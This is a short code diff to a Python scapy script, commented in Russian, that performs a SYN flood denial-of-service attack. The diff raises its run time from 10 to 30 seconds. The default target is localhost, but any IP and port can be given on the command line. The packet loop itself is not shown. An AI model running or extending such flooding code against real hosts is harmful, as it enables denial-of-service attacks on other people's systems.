@@ -2,7 +2,7 @@ from scapy.all import IP, TCP, send, RandShort
 import sys
 import time
 
-def send_syn_flood(target_ip, target_port, duration_seconds=10):
+def send_syn_flood(target_ip, target_port, duration_seconds=30):
     """Отправляет SYN-пакеты в бесконечном цикле в течение заданного времени."""
     print(f"ЗАПУСК SYN FLOOD на {target_ip}:{target_port} на {duration_seconds} секунд...")
     print("Нажми Ctrl+C для досрочной остановки.")
@@ -27,7 +27,7 @@ def send_syn_flood(target_ip, target_port, duration_seconds=10):
 if __name__ == "__main__":
     target_ip = "127.0.0.1"  
     target_port = 80             
-    duration = 10                
+    duration = 30                
 
     if len(sys.argv) > 1:
         target_ip = sys.argv[1]
